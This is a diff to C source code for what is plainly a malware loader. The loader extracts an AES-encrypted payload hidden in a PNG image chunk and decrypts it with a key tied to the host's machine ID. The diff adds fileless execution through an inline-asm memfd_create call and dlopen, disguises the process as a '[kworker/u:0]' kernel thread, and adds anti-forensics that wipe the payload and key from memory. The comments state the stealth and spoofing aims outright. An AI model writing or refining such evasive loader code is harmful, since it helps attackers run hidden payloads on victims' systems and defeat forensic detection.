@@ -9,12 +9,16 @@
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <arpa/inet.h> // For ntohl
+#include <dlfcn.h>     // For dlopen
 
 #include "loader_src/crypto_utils.h"
+
+extern char **environ;
 
 // Configuración
 #define CARRIER_PATH "image.png"
 #define SALT "LO_IS_WATCHING"
+#define FALLBACK_MACHINE_ID "DEADBEEF-CAFE-BABE-FEED-DEADC0DE"
 #define CHUNK_TYPE 0x6C6F4C4F // "loLO" in hex (Big Endian: l=6C, o=6F, L=4C, O=4F)
 // Wait, "loLO" -> 'l'=0x6C, 'o'=0x6F, 'L'=0x4C, 'O'=0x4F.
 // En un archivo, bytes: 6C 6F 4C 4F.
@@ -42,9 +46,16 @@ void derive_key(uint8_t key[32]) {
     // 1. Machine ID
     int fd = open("/var/lib/dbus/machine-id", O_RDONLY);
     if (fd < 0) fd = open("/etc/machine-id", O_RDONLY);
+
+    ssize_t bytes_read = 0;
     if (fd >= 0) {
-        read(fd, machine_id, 32); // Read 32 chars
+        bytes_read = read(fd, machine_id, 32); // Read 32 chars
         close(fd);
+    }
+
+    // Fallback if read failed or file empty
+    if (bytes_read <= 0) {
+        memcpy(machine_id, FALLBACK_MACHINE_ID, 32);
     }
 
     // 2. CPU Model
@@ -104,6 +115,7 @@ uint8_t* extract_chunk(uint8_t* img_data, size_t img_len, size_t* out_len) {
 int main(int argc, char* argv[]) {
     // Anti-Analysis Init
     init_crypto_tables();
+    (void)argc; (void)argv;
 
     // 1. Derive Key
     uint8_t key[32];
@@ -140,21 +152,59 @@ int main(int argc, char* argv[]) {
 
     AES_CTR_xcrypt_buffer(&ctx, payload, payload_len);
 
-    // 5. Exec
-    int fd = syscall(SYS_memfd_create, "worker", MFD_CLOEXEC);
-    if (fd == -1) {
+    // 5. Exec (Stealth memfd via inline asm syscall)
+    // "worker" -> "[kworker/u:0]" for better spoofing
+    const char *name = "[kworker/u:0]";
+    long fd;
+
+    // SYS_memfd_create = 319 (x86_64)
+    // int memfd_create(const char *name, unsigned int flags);
+    // RDI = name, RSI = flags (MFD_CLOEXEC = 0x0001)
+
+    asm volatile (
+        "syscall"
+        : "=a" (fd)
+        : "a" (319), "D" (name), "S" (0x0001) /* MFD_CLOEXEC */
+        : "rcx", "r11", "memory"
+    );
+
+    if (fd < 0) {
         return 1;
     }
 
-    if (write(fd, payload, payload_len) != payload_len) {
+    if (write((int)fd, payload, payload_len) != (ssize_t)payload_len) {
         return 1;
     }
 
     char fd_path[64];
-    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
+    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%ld", fd);
 
-    char* new_argv[] = { "worker_process", NULL };
-    fexecve(fd, new_argv, environ);
+    // 6. Stealth Injection (dlopen)
+    // El payload debe ser una shared library con __attribute__((constructor))
+    void* handle = dlopen(fd_path, RTLD_NOW);
+    if (!handle) {
+        close((int)fd);
+        return 1;
+    }
 
-    return 1;
+
+    // 7. Anti-Forensics (The Ghost Protocol)
+    close((int)fd); // Romper el enlace en /proc
+
+    // Borrar payload de memoria heap
+    // (Usamos volatile para asegurar que el compilador no lo optimice)
+    volatile uint8_t *p = payload;
+    size_t n = payload_len;
+    while(n--) *p++ = 0;
+
+    volatile uint8_t *k = key;
+    n = 32;
+    while(n--) *k++ = 0;
+
+    // Mantener proceso vivo si el payload lanzó hilos, o salir si ya terminó.
+    // Usualmente el payload lanzará un hilo y retornará.
+    // Para asegurar que el proceso principal no muera y mate los hilos:
+    pause(); // Esperar señales eternamente
+
+    return 0;
 }
